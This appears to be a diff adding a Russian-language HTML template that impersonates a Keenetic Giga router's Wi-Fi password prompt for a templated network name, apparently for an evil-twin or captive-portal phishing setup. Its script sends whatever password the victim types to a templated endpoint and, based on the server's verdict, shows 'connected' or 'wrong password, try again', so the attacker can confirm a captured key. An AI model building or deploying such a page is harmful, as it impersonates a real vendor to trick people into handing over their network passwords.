@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="color-scheme" content="light">
+<title>{{TITLE}}</title>
+<style>
+  :root{
+    --accent:#2b9a55;--accent-d:#237e45;--ink:#18211c;--muted:#69756e;
+    --bg:#eef2ef;--card:#fff;--line:#d8ded9;--bad:#bd3226;--ok:#217a44;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  body{
+    min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:28px 16px;
+    background:var(--bg);color:var(--ink);
+    font:16px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+    -webkit-text-size-adjust:100%;
+  }
+  .card{
+    width:100%;max-width:392px;background:var(--card);border-radius:12px;overflow:hidden;
+    box-shadow:0 1px 2px rgba(16,24,40,.06),0 14px 34px -16px rgba(20,40,30,.35);
+  }
+  .top{background:#f4f7f4;border-bottom:1px solid var(--line);padding:20px 24px 18px;display:flex;align-items:center;gap:10px}
+  .top svg{display:block}
+  .top b{font-size:18px;font-weight:600;letter-spacing:.6px;color:#1f2b23}
+  .model{margin-left:auto;font-size:11.5px;letter-spacing:.6px;text-transform:uppercase;color:var(--muted)}
+  .body{padding:22px 24px 24px}
+  h1{margin:0 0 6px;font-size:21px;line-height:1.25;font-weight:600}
+  .sub{margin:0 0 20px;font-size:14px;color:var(--muted)}
+  .sub b{color:var(--ink);font-weight:600;word-break:break-word}
+  label{display:block;font-size:13px;font-weight:600;color:#38443d;margin-bottom:7px}
+  input{
+    display:block;width:100%;height:48px;padding:0 14px;font-size:16px;color:var(--ink);
+    background:#fff;border:1px solid var(--line);border-radius:10px;outline:none;
+    transition:border-color .15s,box-shadow .15s;
+  }
+  input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(43,154,85,.16)}
+  input[aria-invalid="true"]{border-color:var(--bad)}
+  .err{margin:6px 0 0;min-height:16px;font-size:12.5px;color:var(--bad)}
+  button{
+    width:100%;min-height:48px;margin-top:12px;display:inline-flex;align-items:center;justify-content:center;gap:9px;
+    font:600 16px/1 inherit;color:#fff;background:var(--accent);border:0;border-radius:10px;cursor:pointer;
+    transition:background .15s,opacity .15s;
+  }
+  button:hover{background:var(--accent-d)}
+  button:disabled{opacity:.75;cursor:default}
+  .spin{
+    width:16px;height:16px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;
+    display:none;animation:r .7s linear infinite;
+  }
+  button.busy .spin{display:block}
+  @keyframes r{to{transform:rotate(360deg)}}
+  .note{margin:14px 0 0;min-height:20px;font-size:13.5px;color:var(--muted);text-align:center}
+  .note.bad{color:var(--bad);font-weight:600}
+  .hint{margin:18px 0 0;font-size:12.5px;color:var(--muted)}
+  .done{text-align:center;padding:26px 24px 28px}
+  .done svg{display:block;margin:0 auto 14px}
+  .done h2{margin:0 0 8px;font-size:20px}
+  .done p{margin:0;font-size:14px;color:var(--muted)}
+  [hidden]{display:none!important}
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="top">
+    <svg width="28" height="28" viewBox="0 0 28 28" aria-hidden="true">
+      <path d="M14 2.5L25.5 14 14 25.5 2.5 14z" fill="none" stroke="#2b9a55" stroke-width="2.4" stroke-linejoin="round"/>
+      <path d="M14 8.6L19.4 14 14 19.4 8.6 14z" fill="#2b9a55"/>
+    </svg>
+    <b>Keenetic</b>
+    <span class="model">Giga</span>
+  </div>
+
+  <div class="body">
+    <h1>Подключение к беспроводной сети</h1>
+    <p class="sub">Для сети <b>{{SSID}}</b> задан пароль. Введите его, чтобы получить доступ.</p>
+
+    <form id="f" novalidate autocomplete="off">
+      <label for="password">Пароль сети</label>
+      <input id="password" name="password" type="password" spellcheck="false" autocapitalize="none"
+             autocomplete="off" placeholder="Введите пароль" aria-describedby="e-password">
+      <p class="err" id="e-password" aria-live="polite"></p>
+      <button id="go" type="submit"><span class="spin" aria-hidden="true"></span><span class="lbl">Подключиться</span></button>
+    </form>
+
+    <p class="note" id="note" role="status" aria-live="polite"></p>
+    <p class="hint" id="hint">Заводской пароль указан на стикере на корпусе устройства.</p>
+
+    <section class="done" id="done" hidden style="padding:0">
+      <svg width="44" height="44" viewBox="0 0 44 44" aria-hidden="true">
+        <circle cx="22" cy="22" r="21" fill="#e7f4ec"/>
+        <path d="M14.5 22.4l5.3 5.3 9.7-10.4" fill="none" stroke="#217a44" stroke-width="2.6"
+              stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <h2>Подключено</h2>
+      <p>Сеть <b>{{SSID}}</b> доступна. Окно можно закрыть.</p>
+    </section>
+  </div>
+</main>
+
+<script>
+(function () {
+  var form = document.getElementById('f');
+  var input = document.getElementById('password');
+  var note = document.getElementById('note');
+  var btn = document.getElementById('go');
+  var label = btn.querySelector('.lbl');
+  var done = document.getElementById('done');
+  var hint = document.getElementById('hint');
+  var head = document.querySelector('h1');
+  var sub = document.querySelector('.sub');
+  var busy = false;
+  var timer = 0;
+
+  function setError(msg) {
+    document.getElementById('e-password').textContent = msg || '';
+    input.setAttribute('aria-invalid', msg ? 'true' : 'false');
+  }
+
+  function state(bad, text) {
+    note.textContent = text || '';
+    note.className = 'note' + (bad ? ' bad' : '');
+  }
+
+  function setBusy(on) {
+    busy = on;
+    btn.disabled = on;
+    btn.classList.toggle('busy', on);
+    label.textContent = on ? 'Проверяем…' : 'Подключиться';
+  }
+
+  form.addEventListener('submit', function (ev) {
+    ev.preventDefault();
+    if (busy) return;
+    clearTimeout(timer);
+    if (!input.value.trim()) {
+      setError('Введите пароль сети');
+      input.focus();
+      return;
+    }
+    setError('');
+    state(false, '');
+    setBusy(true);
+
+    var data = {};
+    new FormData(form).forEach(function (v, k) { data[k] = String(v); });
+
+    fetch('{{ACTION}}', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    })
+      .then(function (r) { return r.json(); })
+      .then(function (res) {
+        var verdict = (res && res.verdict) || 'pending';
+        if (verdict === 'ok') {
+          form.hidden = true;
+          hint.hidden = true;
+          head.hidden = true;
+          sub.hidden = true;
+          state(false, '');
+          done.hidden = false;
+          return;
+        }
+        if (verdict === 'retry') {
+          setBusy(false);
+          state(true, 'Неверный пароль. Проверьте раскладку и попробуйте снова.');
+          input.select();
+          return;
+        }
+        state(false, 'Проверяем пароль, переподключение…');
+        timer = setTimeout(function () {
+          setBusy(false);
+          state(false, 'Если подключение не произошло, отправьте пароль ещё раз.');
+        }, 4000);
+      })
+      .catch(function () {
+        setBusy(false);
+        state(true, 'Роутер не ответил. Попробуйте ещё раз.');
+      });
+  });
+
+  input.focus({ preventScroll: true });
+})();
+</script>
+</body>
+</html>
